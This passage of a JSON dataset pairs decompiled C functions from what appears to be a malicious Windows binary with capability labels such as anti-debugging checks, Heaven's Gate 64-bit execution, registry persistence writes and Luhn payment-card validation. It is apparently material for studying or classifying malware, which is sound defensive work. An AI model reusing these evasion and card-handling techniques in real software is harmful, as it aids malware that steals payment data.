iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40708c, arg_8h);\n    (*pcVar2)(&var_264h, 0x4070a4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070cc;\n    var_30h = 0x4070d8;\n    var_2ch = 0x4070e4;\n    var_28h = 0x4070f4;\n    var_24h = 0x4070fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1096
    },
    "00402db0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402db0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00404ec0(0x80000002, 0x4071d8, 0x407224, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 134
    },
    "00403730": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403730(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 181
    },
    "00404410": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040464c) overlaps instruction at (ram,0x0040464b)\n// \n\nvoid __fastcall fcn.00404410(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    uint16_t uVar2;\n    int32_t arg_ch;\n    uint8_t uVar4;\n    uint8_t extraout_CH;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    int32_t *piVar5;\n    int32_t extraout_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    int16_t iVar6;\n    int32_t unaff_ESI;\n    uint8_t uVar7;\n    bool in_ZF;\n    char in_SF;\n    char cVar8;\n    bool bVar9;\n    char in_OF;\n    char cVar10;\n    unkbyte10 extraout_ST0;\n    ulong uVar11;\n    int32_t iVar12;\n    uint arg_10h;\n    uint32_t uVar13;\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_14h;\n    \n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (param_1 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00404b80(0x407490, 0xb, 0x40738c, 0x20);\n    fcn.00404b80(0x407490, 0xb, 0x4073ac, 0x26);\n    fcn.00404b80(0x407490, 0xb, 0x4073d4, 8);\n    uVar11 = fcn.00404b80(0x407490, 0xb, 0x4073dc, 0x19);\n    piVar5 = uVar11 >> 0x20;\n    *(uVar11 + -0x7ce92414) = extraout_ST0;\n    *piVar5 = *piVar5 + 0xb6adf84;\n    fcn.00404b80(0x407490, 0xb, 0x4073f8, unaff_EBX);\n    fcn.00404b80(0x407490, 0xb, 0x407404, 0x12);\n    fcn.00404b80(0x407490, 0xb, 0x407418, 0x12);\n    iVar6 = unaff_ESI + 1;\n    cVar10 = SBORROW2(iVar6, iVar6);\n    cVar8 = '\\0';\n    arg_14h = 2;\n    arg_10h_00 = 0x40742c;\n    arg_ch_00 = 0xb;\n    uVar13 = 0x40456b;\n    iVar12 = unaff_ESI;\n    arg_10h = unaff_EBP;\n    fcn.00404b80(0x407490, 0xb, 0x40742c, 2);\n    uVar3 = extraout_ECX;\n    if (cVar10 == cVar8) {\n        uVar13 = uVar13 & 0xffff | extraout_ECX << 0x10;\n        uVar3 = extraout_ECX & 0xffff;\n        uVar4 = (extraout_ECX << 0x10) >> 0x18;\n        if (cVar10 == cVar8) goto code_r0x00404580;\n        puVar1 = unaff_ESI + 0x30;\n        *puVar1 = *puVar1 | uVar4;\n        if (*puVar1 != 0) goto code_r0x00404586;\n        arg_ch = unaff_ESI + 1;\n        bVar9 = arg_ch == 0;\n        iVar12 = extraout_EDX;\n        if (!bVar9) {\n            *(extraout_EDX + 0xb) = *(extraout_EDX + 0xb) + uVar4;\n            goto code_r0x004045cc;\n        }\n    }\n    else {\ncode_r0x00404580:\n        uVar4 = uVar3 >> 8;\n        uVar13 = 8;\n        arg_10h = 0x407430;\n        iVar12 = 0xb;\ncode_r0x00404586:\n        *(extraout_EDX + 0xb) = *(extraout_EDX + 0xb) + uVar4;\n        fcn.00404b80(0x407490, iVar12, arg_10h, uVar13);\n        fcn.00404b80(0x407490, 0xb, 0x407438, 8);\n        arg_14h = 6;\n        arg_10h_00 = 0x407440;\n        arg_ch_00 = 0xb;\n        arg_10h = unaff_EBP;\ncode_r0x004045cc:\n        uVar2 = fcn.00404b80(0x407490, arg_ch_00, arg_10h_00, arg_14h);\n        uVar7 = 0;\n        bVar9 = (uVar2 ^ unaff_EBX) < 0;\n        uVar13 = 0x4045f1;\n        uVar11 = fcn.00404b80(0x407490, 0xb, 0x407448, 7);\n        iVar12 = uVar11 >> 0x20;\n        uVar4 = extraout_CH;\n        if ((bVar9) || (!bVar9)) {\n            uVar13 = 7;\n            arg_10h = 0x407450;\n            arg_ch = 0xb;\n            goto code_r0x0040460c;\n        }\n        arg_ch = uVar11 + 0x68076a2f + uVar7;\n        bVar9 = arg_ch == 0;\n    }\n    if (bVar9) {\n        return;\n    }\ncode_r0x0040460c:\n    *(iVar12 + 0xb) = *(iVar12 + 0xb) + uVar4;\n    fcn.00404b80(0x407490, arg_ch, arg_10h, uVar13);\n    fcn.00404b80(0x407490, 0xb, 0x407458, 6);\n    fcn.00404b80(0x407490, 0xb, 0x407460, 0x25);\n    fcn.00404b80(0x407490, 0xb, 0x407488, 8);\n    return;\n}\n",
        "token_count": 1537
    },
    "00403a60": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87",
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403d1d) overlaps instruction at (ram,0x00403d19)\n// \n// WARNING: Removing unreachable block (ram,0x00404066)\n\nvoid fcn.00403a60(void)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    int16_t iVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint8_t uVar9;\n    uint8_t extraout_CH_02;\n    ushort extraout_CX;\n    uint16_t uVar10;\n    char extraout_CH_04;\n    ushort extraout_CX_00;\n    uint8_t extraout_CH;\n    uint8_t extraout_CH_00;\n    char extraout_CH_01;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    char extraout_CH_03;\n    int32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint32_t extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint8_t extraout_CH_05;\n    uint extraout_ECX_05;\n    uint8_t extraout_DL;\n    ushort uVar11;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t iVar12;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t extraout_EDX_02;\n    int32_t extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    char *unaff_EBX;\n    int32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar13;\n    uchar *puVar14;\n    uint *puVar15;\n    uint16_t in_CS;\n    uint8_t uVar16;\n    bool bVar17;\n    uchar uVar18;\n    uchar uVar19;\n    bool bVar20;\n    char cVar21;\n    uint8_t in_IF;\n    bool bVar22;\n    char cVar23;\n    ulong uVar24;\n    uint64_t uVar25;\n    uint in_stack_ffffff71;\n    uint in_stack_ffffff75;\n    uint in_stack_ffffff79;\n    uint uVar26;\n    uint uVar27;\n    uint arg_14h;\n    ushort in_stack_ffffffa9;\n    ushort in_stack_ffffffab;\n    ushort in_stack_ffffffad;\n    ushort uVar28;\n    ushort in_stack_ffffffaf;\n    uint in_stack_ffffffb9;\n    uint in_stack_ffffffbd;\n    ushort in_stack_ffffffc9;\n    ushort in_stack_ffffffcb;\n    ushort in_stack_ffffffcd;\n    ushort in_stack_ffffffcf;\n    ushort uVar29;\n    uint32_t uVar30;\n    uint uVar31;\n    \n    bVar22 = false;\n    fcn.00404b80(0x407490, 0xb, 0x407024, 10);\n    fcn.00404b80(0x407490, 0xb, 0x407030, 0x12);\n    fcn.00404b80(0x407490, 0xb, 0x407044, 4);\n    fcn.00404b80(0x407490, 0xb, 0x407048, 0xc);\n    fcn.00404b80(0x407490, 0xb, 0x407054, 7);\n    uVar24 = fcn.00404b80(0x407490, 0xb, 0x40705c, 0xb);\n    bVar17 = ((uVar24 >> 0x20 & 0xffffff00 | extraout_CH) & uVar24) == 0;\n    uVar24 = fcn.00404b80(0x407490, 0xb, 0x407068, 0xc);\n    if (bVar17) {\ncode_r0x00403b8d:\n        uVar28 = 8;\n        uVar18 = 0;\n        uVar9 = 0;\n    }\n    else {\n        uVar28 = SUB42(unaff_EDI, 0);\n        uVar18 = unaff_EDI >> 0x10;\n        uVar9 = unaff_EDI >> 0x18;\n        puVar13 = unaff_EDI & 0xffffff | uVar9 << 0x18;\n        unaff_EDI = puVar13;\n        if (!bVar17) goto code_r0x00403b8d;\n        unaff_EDI = puVar13 + 1;\n        uVar11 = uVar24 >> 0x20;\n        uVar31 = in(uVar11);\n        *puVar13 = uVar31;\n        if (&stack0xffffffe5 < 1) {\n            *(unaff_ESI + -0x7f) = *(unaff_ESI + -0x7f) + (uVar24 >> 8);\n            out(uVar11, uVar24);\n            pcVar3 = swi(1);\n            (*pcVar3)();\n            return;\n        }\n    }\n    puVar1 = (uVar24 >> 0x20) + 8;\n    bVar17 = false;\n    *puVar1 = *puVar1 ^ extraout_CH_00;\n    uVar31 = 0x407074;\n    uVar30 = 0xb;\n    uVar11 = 0x3ba0;\n    uVar29 = 0x40;\n    fcn.00404b80(0x407490, 0xb, 0x407074, CONCAT13(uVar9, CONCAT12(uVar18, uVar28)));\n    if ((bVar17) || (!bVar17)) {\n        uVar11 = 0xd;\n        uVar29 = 0;\n        in_stack_ffffffcd = 0x707c;\n        in_stack_ffffffcf = 0x40;\n        in_stack_ffffffc9 = 0xb;\n        in_stack_ffffffcb = 0;\ncode_r0x00403bb6:\n        pcVar8 = extraout_EDX + 0xb;\n        bVar17 = SCARRY1(*pcVar8, extraout_CH_01);\n        *pcVar8 = *pcVar8 + extraout_CH_01;\n        uVar24 = fcn.00404b80(0x407490, CONCAT22(in_stack_ffffffcb, in_stack_ffffffc9), \n                              CONCAT22(in_stack_ffffffcf, in_stack_ffffffcd), CONCAT22(uVar29, uVar11));\n        iVar12 = uVar24 >> 0x20;\n        if ((bVar17) || (!bVar17)) {\n            uVar26 = 0x18;\n            in_stack_ffffffbd = 0x40708c;\n            in_stack_ffffffb9 = 0xb;\n        }\n        else {\n            puVar13 = unaff_EDI + 1;\n            puVar15 = unaff_ESI + 1;\n            *unaff_EDI = *unaff_ESI;\n            iVar12 = -0x7397e796;\n            unaff_ESI = puVar15;\n            unaff_EDI = puVar13;\n            uVar26 = extraout_ECX;\n            if (SCARRY4(uVar24, 1)) {\n                unaff_EBX[0x515010c4] = unaff_EBX[0x515010c4] + uVar24 + '\\x01';\n                goto code_r0x00403c1e;\n            }\n        }\n        *(iVar12 + 0xb) = *(iVar12 + 0xb) + (extraout_ECX >> 8);\n        fcn.00404b80(0x407490, in_stack_ffffffb9, in_stack_ffffffbd, uVar26);\n        fcn.00404b80(0x407490, 0xb, 0x4070a4, 0x25);\n        puVar13 = unaff_EDI;\n    }\n    else {\n        puVar13 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n        unaff_EBX = unaff_EBP + 0x680d6a76;\n        unaff_EDI = puVar13;\n        if (-1 < puVar13) goto code_r0x00403bb6;\n    }\ncode_r0x00403c1e:\n    fcn.00404b80(0x407490, 0xb, 0x4070cc, 10);\n    bVar17 = extraout_DX + (extraout_DX >> 8) == '\\0';\n    fcn.00404b80(0x407490, 0xb, 0x4070d8, 0xc);\n    if (bVar17) {\ncode_r0x00403c80:\n        uVar28 = 0xd;\n        uVar18 = 0;\n        uVar9 = 0;\ncode_r0x00403c78:\n        *(extraout_EDX_00 + 0xd) = *(extraout_EDX_00 + 0xd) ^ extraout_CH_02;\n        fcn.00404b80(0x407490, 0xb, 0x4070e4, CONCAT13(uVar9, CONCAT12(uVar18, uVar28)));\n        fcn.00404b80(0x407490, 0xb, 0x4070f4, 6);\n        iVar5 = puVar13;\n        cVar23 = SBORROW2(iVar5, 1);\n        cVar21 = iVar5 + -1 < 0;\n        bVar17 = iVar5 == 1;\n        fcn.00404b80(0x407490, 0xb, 0x4070fc, 5);\n        if (!bVar17 && cVar23 == cVar21) {\n            unaff_ESI = unaff_ESI & 0xffff0000 | unaff_ESI & 0xff | (unaff_ESI >> 8) << 8;\n        }\n        uVar28 = 0xd;\n        uVar18 = 0;\n        uVar9 = 0;\n        uVar31 = 0x407104;\n        uVar30 = 0xb;\n    }\n    else {\n        uVar28 = SUB42(puVar13, 0);\n        uVar18 = puVar13 >> 0x10;\n        uVar9 = puVar13 >> 0x18;\n        puVar15 = puVar13 & 0xffffff | uVar9 << 0x18;\n        puVar13 = puVar15;\n        if (!bVar17) goto code_r0x00403c80;\n        puVar13 = puVar15 + 1;\n        uVar26 = in(extraout_EDX_00);\n        *puVar15 = uVar26;\n        if (0 < &stack0xffffffe5) goto code_r0x00403c78;\n        *(extraout_EDX_00 + 0xb) = *(extraout_EDX_00 + 0xb) + extraout_CH_02;\n    }\n    while( true ) {\n        iVar5 = fcn.00404b80(0x407490, uVar30, uVar31, CONCAT13(uVar9, CONCAT12(uVar18, uVar28)));\n        bVar17 = ((unaff_EBX ^ 0x70c5) - iVar5 >> 8 | extraout_CX >> 8) - extraout_CX < '\\0';\n        uVar28 = 0x3d23;\n        uVar18 = 0x40;\n        uVar9 = 0;\n        fcn.00404b80(0x407490, 0xb, 0x407114, 0x19);\n        if ((bVar17) || (!bVar17)) {\n            uVar28 = 0xf;\n            uVar18 = 0;\n            uVar9 = 0;\n            uVar31 = 0x407130;\n            uVar30 = 0xb;\n        }\n        *(extraout_ECX_00 + 0x40) = *(extraout_ECX_00 + 0x40) ^ extraout_EDX_01 >> 8;\n        puVar1 = extraout_EDX_01 + 0xb;\n        uVar4 = extraout_ECX_00 >> 8;\n        bVar17 = CARRY1(*puVar1, uVar4);\n        *puVar1 = *puVar1 + uVar4;\n        puVar6 = fcn.00404b80(0x407490, uVar30, uVar31, CONCAT13(uVar9, CONCAT12(uVar18, uVar28)));\n        if ((bVar17) || (!bVar17)) break;\n        uVar7 = puVar6 + 1;\n        if (&stack0xffffffd5 < *puVar6 || uVar7 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar4 = uVar7 + extraout_CH_03;\n        pcVar8 = uVar7 & 0xffffff00 | uVar4;\n        unaff_EBP = -0x48073f75;\n        uVar30 = uVar30 & 0xffff0000 | in_CS;\n        *pcVar8 = *pcVar8 + uVar4;\n    }\n    fcn.00404b80(0x407490, 0xb, 0x407140, 0xe);\n    fcn.00404b80(0x407490, 0xb, 0x407150, 0xb);\n    while( true ) {\n        bVar17 = false;\n        puVar6 = fcn.00404b80(0x407490, 0xb, 0x40715c, 0xb);\n        if ((bVar17) || (puVar13 = puVar13 & 0xffff0000 | puVar13 & 0xff | (puVar13 >> 8) << 8,  !bVar17)) break;\n        if (&stack0xffffffe5 < *puVar6 || puVar6 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00404b80(0x407490, 0xb, 0x407168, 0xb);\n    iVar12 = fcn.00404b80(0x407490, 0xb, 0x407174, 10);\n    iVar12 = extraout_ECX_01 - iVar12;\n    uVar10 = iVar12 & 0xff00 | iVar12 ^ iVar12 >> 8 | 0x3d00 | unaff_EBX;\n    uVar9 = uVar10;\n    uVar4 = uVar10 >> 8;\n    uVar16 = uVar4 < uVar9;\n    uVar18 = uVar4 == uVar9;\n    fcn.00404b80(0x407490, 0xb, 0x407180, 0xc);\n    if ((!uVar18) && (uVar18)) {\n        bVar22 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        uVar18 = ((uVar18 & 1) * '@' & 0x40) != 0;\n        uVar16 = (uVar16 & 1) != 0;\n    }\n    fcn.00404b80(0x407490, 0xb, 0x40718c, 0xe);\n    uVar28 = 0x11;\n    uVar11 = 0;\n    uVar31 = 0x403ec2;\n    uVar24 = fcn.00404b80(0x407490, 0xb, 0x40719c, 0x11);\n    if ((uVar16 || uVar18) || (!uVar16 && !uVar18)) {\n        uVar31 = 0x13;\n        in_stack_ffffffbd = 0x4071b0;\n        in_stack_ffffffb9 = 0xb;\n        cVar21 = extraout_CH_04;\n    }\n    else {\n        cVar21 = extraout_CH_04 - *unaff_EBX;\n        puVar6 = puVar13 + 0x6a;\n        puVar14 = *puVar6;\n        *puVar6 = *puVar6 - &stack0xffffffc5;\n        piVar2 = uVar24 + -0x50;\n        iVar12 = unaff_EBP + *piVar2;\n        uVar30 = iVar12 + (puVar14 < &stack0xffffffc5);\n        if (SCARRY4(unaff_EBP, *piVar2) == SCARRY4(iVar12, puVar14 < &stack0xffffffc5)) goto code_r0x00403f21;\n    }\n    pcVar8 = (uVar24 >> 0x20) + 0xb;\n    *pcVar8 = *pcVar8 + cVar21;\n    fcn.00404b80(0x407490, in_stack_ffffffb9, in_stack_ffffffbd, uVar31);\n    if (&stack0xffffffb5 < 0xffffffc0) {\n        puVar13 = puVar13 & 0xffff0000 | puVar13 & 0xff | (puVar13 >> 8) << 8;\n    }\n    puVar13 = puVar13 + bVar22 * -2 + 1;\n    unaff_ESI = unaff_ESI + -1;\n    uVar24 = func_0x10189e72();\n    uVar30 = (uVar24 >> 0x20) + 0x14;\n    fcn.00404b80(0x407490, 0xb, 0x4071c4, CONCAT22(uVar11, uVar28));\ncode_r0x00403f21:\n    fcn.00404b80(0x407490, 0xb, 0x4071d8, 0x33);\n    fcn.00404b80(0x407490, 0xb, 0x40720c, 10);\n    fcn.00404b80(0x407490, 0xb, 0x407218, 4);\n    uVar9 = unaff_EBX;\n    bVar17 = false;\n    uVar18 = (CONCAT11(extraout_CX_00 >> 8 & unaff_EBX >> 8, extraout_CX_00 | uVar9) & puVar13) == 0;\n    uVar31 = fcn.00404b80(0x407490, 0xb, 0x40721c, 5);\n    if ((!bVar17) && (bVar17)) {\n        out(0xbd, uVar31);\n        return;\n    }\n    uVar31 = 0x403fcb;\n    uVar24 = fcn.00404b80(0x407490, 0xb, 0x407224, 6);\n    if ((bVar17 || uVar18) || (!bVar17 && !uVar18)) {\n        uVar31 = 0x2a;\n        in_stack_ffffffad = 0x7258;\n        in_stack_ffffffaf = 0x40;\n        in_stack_ffffffa9 = 0xb;\n        in_stack_ffffffab = 0;\n        uVar7 = extraout_ECX_02;\n    }\n    else {\n        uVar4 = (extraout_ECX_02 >> 8) - *unaff_EBX;\n        *(puVar13 + 0x6a) = *(puVar13 + 0x6a) - &stack0xffffffb5;\n        puVar1 = uVar24 + 0x58;\n        uVar10 = CONCAT11(uVar4 - *puVar1, extraout_ECX_02);\n        uVar7 = uVar10;\n        if (uVar4 < *puVar1) {\n            cVar23 = '\\0';\n            cVar21 = (uVar10 | 0x31fd) < 0;\n            uVar18 = fcn.00404b80(0x407490, 0xb, 0x407010, 0x11);\n            if ((cVar23 == cVar21) && (cVar23 != cVar21)) {\n                unaff_ESI = unaff_ESI + -1;\n                puVar14 = puVar13 | uVar30;\n                puVar13 = puVar14 + bVar22 * -2 + 1;\n                *puVar14 = uVar18;\n            }\n            fcn.00404b80(0x407490, 0xb, 0x40722c, 0xf);\n            fcn.00404b80(0x407490, 0xb, 0x40723c, 0x1a);\n            bVar17 = SBORROW4(extraout_ECX_03 & 0xffff0000 | CONCAT11((extraout_ECX_03 >> 8) - uVar9, extraout_ECX_03), \n                              extraout_EDX_02);\n            uVar31 = 0x4040d8;\n            fcn.00404b80(0x407490, 0xb, 0x407290, 10);\n            if ((bVar17) || (!bVar17)) {\n                uVar31 = 0xb;\n            }\n            fcn.00404b80(0x407490, 0xb, 0x40729c, uVar31);\n            uVar18 = 0;\n            uVar19 = (extraout_DL & uVar9) == 0;\n            fcn.00404b80(0x407490, 0xb, 0x4072a8, 8);\n            fcn.00404b80(0x407490, 0xb, 0x4072b0, 9);\n            if ((!uVar18 && !uVar19) && (uVar18 || uVar19)) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            uVar26 = 0x4072bc;\n            uVar31 = 0xb;\n            uVar7 = 0x404182;\n            fcn.00404b80(0x407490, 0xb, 0x4072bc, 9);\n            fcn.00404b80(0x407490, 0xb, 0x4072c8, 9);\n            fcn.00404b80(0x407490, 0xb, 0x4072d4, 0xc);\n            fcn.00404b80(0x407490, 0xb, 0x4072e0, 3);\n            uVar28 = 10;\n            uVar11 = 0;\n            while( true ) {\n                fcn.00404b80(0x407490, 0xb, 0x4072e4, CONCAT22(uVar11, uVar28));\n                bVar17 = 0xffffffef < &stack0xffffffa1;\n                puVar6 = fcn.00404b80(0x407490, 0xb, 0x4072f0, 0x40);\n                if ((bVar17) || (!bVar17)) break;\n                uVar28 = 0xc08b;\n                uVar11 = 0xb7f8;\n                if (&stack0xffffffa1 < *puVar6 || puVar6 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            fcn.00404b80(0x407490, 0xb, 0x407330, 0xc);\n            fcn.00404b80(0x407490, 0xb, 0x40733c, 0xb);\n            iVar5 = fcn.00404b80(0x407490, 0xb, 0x407348, 4);\n            bVar17 = false;\n            bVar20 = ((puVar13 | 0x74e3) - iVar5 & 0x1a8) == 0;\n            arg_14h = 0x404327;\n            fcn.00404b80(0x407490, 0xb, 0x40734c, 4);\n            uVar9 = extraout_ECX_04 >> 8;\n            if ((bVar17 || bVar20) || (!bVar17 && !bVar20)) {\n                arg_14h = 0xc;\n                uVar30 = 0x407350;\n                uVar27 = 0xb;\n                iVar12 = extraout_EDX_03;\n                goto code_r0x00404347;\n            }\n            puVar15 = puVar13 + bVar22 * -2 + 1;\n            *puVar13 = *unaff_ESI;\n            bVar17 = false;\n            uVar25 = CONCAT44(extraout_EDX_03, &stack0xffffffa1) | 0x68;\n            uVar27 = extraout_ECX_04;\n            unaff_ESI = unaff_ESI + bVar22 * -2 + 1;\n            do {\n                iVar12 = uVar25 >> 0x20;\n                uVar9 = uVar27 >> 8;\n                uVar7 = uVar7 & 0xffff | puVar15 << 0x10;\n                puVar13 = puVar15 & 0xffff;\n                if (!bVar17) break;\n                pcVar8 = uVar25 + 1;\n                uVar27 = 0xb7f8c08b;\n                if (&stack0xffffff81 < *uVar25 || pcVar8 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                *pcVar8 = *pcVar8 + pcVar8;\ncode_r0x00404347:\n                puVar1 = iVar12 + 0xb;\n                bVar17 = CARRY1(*puVar1, uVar9);\n                *puVar1 = *puVar1 + uVar9;\n                cVar21 = fcn.00404b80(0x407490, uVar27, uVar30, arg_14h);\n                if ((bVar17) || (!bVar17)) {\n                    iVar12 = 4;\n                    uVar26 = 0x40735c;\n                    uVar31 = 0xb;\n                }\n                else {\n                    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n                    iVar12 = extraout_EDX_04;\n                    if (cVar21 + '\\r' + (bVar17 == false) < 0x98) goto code_r0x004043b3;\n                }\n                puVar1 = extraout_EDX_04 + 0xb;\n                bVar17 = CARRY1(*puVar1, extraout_CH_05);\n                *puVar1 = *puVar1 + extraout_CH_05;\n                uVar7 = 0x404380;\n                uVar25 = fcn.00404b80(0x407490, uVar31, uVar26, iVar12);\n                uVar27 = extraout_ECX_05;\n                puVar15 = puVar13;\n            } while (!bVar17);\n            uVar7 = 9;\n            in_stack_ffffff79 = 0x407360;\n            in_stack_ffffff75 = 0xb;\n            in_stack_ffffff71 = 0x407490;\ncode_r0x004043b3:\n            fcn.00404b80(in_stack_ffffff71, in_stack_ffffff75, in_stack_ffffff79, uVar7);\n            fcn.00404b80(0x407490, 0xb, 0x40736c, 0x16);\n            fcn.00404b80(0x407490, 0xb, 0x407384, 7);\n            return;\n        }\n    }\n    pcVar8 = (uVar24 >> 0x20) + 0xb;\n    *pcVar8 = *pcVar8 + (uVar7 >> 8);\n    fcn.00404b80(0x407490, CONCAT22(in_stack_ffffffab, in_stack_ffffffa9), \n                 CONCAT22(in_stack_ffffffaf, in_stack_ffffffad), uVar31);\n    fcn.00404b80(0x407490, 0xb, 0x407284, 0xb);\n    return;\n}\n",
        "token_count": 6444
    },
    "004046b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004046b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00402970();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004036d0();\n        arg_ch_01 = fcn.004036d0();\n        arg_ch_02 = fcn.004036d0();\n        fcn.004035f0(arg_10h, arg_ch_00);\n        fcn.004035f0(arg_8h, arg_ch_01);\n        fcn.004035f0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407024, &lpBuffer, arg_10h);\n        iVar2 = fcn.00401150(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_8h);\n            iVar2 = fcn.00401150(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_ch);\n                iVar2 = fcn.00401150(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004035f0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 613
    },
    "00404b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
